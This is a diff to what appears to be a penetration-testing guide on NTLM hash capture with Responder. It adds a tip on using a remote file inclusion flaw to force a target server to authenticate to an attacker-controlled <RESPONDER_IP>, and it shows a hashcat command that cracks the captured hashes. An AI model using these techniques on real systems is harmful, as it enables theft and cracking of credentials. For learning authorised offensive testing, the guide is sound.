@@ -80,6 +80,10 @@ Let's look at an example to understand this better:
 hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
+**Cool Trick**:
+Suppose you have a host which hosts a web application, and say you found a RFI vulnerability on it. You can use a custom URL query like `http://target.com/index.php?page=//<RESPONDER_IP>/somefile` to trigger an SMB authentication request to your
+`Responder` instance. This eliminates the waiting period for Step #2 and takes out the reliance on the victim making a mistake. 
+
 If you cannot run Responder for whatever reasons, you can also try [Inveigh](https://github.com/Kevin-Robertson/Inveigh).
 
 **Caveats**
